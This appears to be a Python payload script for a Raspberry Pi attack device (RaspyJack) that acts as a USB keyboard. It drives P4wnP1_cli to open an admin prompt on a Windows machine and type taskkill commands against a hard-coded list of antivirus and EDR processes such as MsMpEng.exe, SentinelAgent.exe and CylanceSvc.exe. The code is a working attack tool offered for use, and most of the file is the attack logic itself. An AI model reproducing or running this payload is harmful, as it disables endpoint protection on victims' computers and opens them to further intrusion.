#!/usr/bin/env python3
"""
RaspyJack *payload* – **Evil: Process Killer (AV/EDR)**
========================================================
A HID attack that attempts to kill common antivirus and EDR processes
on a Windows machine.

**NOTE:** This requires an elevated (admin) prompt to be effective. It
will attempt to get one via the UAC prompt. This is also very noisy
and will be logged by security products if they are not successfully
terminated.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
# A list of common AV/EDR process names
PROCESSES_TO_KILL = [
    "MsMpEng.exe", "NisSrv.exe", "MsSense.exe", "avp.exe", "avguard.exe",
    "bdagent.exe", "mbam.exe", "SentinelAgent.exe", "CylanceSvc.exe"
]

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Process Killer"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # Build the command string
    kill_commands = ""
    for proc in PROCESSES_TO_KILL:
        kill_commands += f"taskkill /f /im {proc}; "
    
    script = f"""
GUI x
delay(500)
press("a")
delay(1500)
type("{kill_commands}")
delay(200)
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!", "AV/EDR processes", "targeted."])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Process Killer payload finished.")
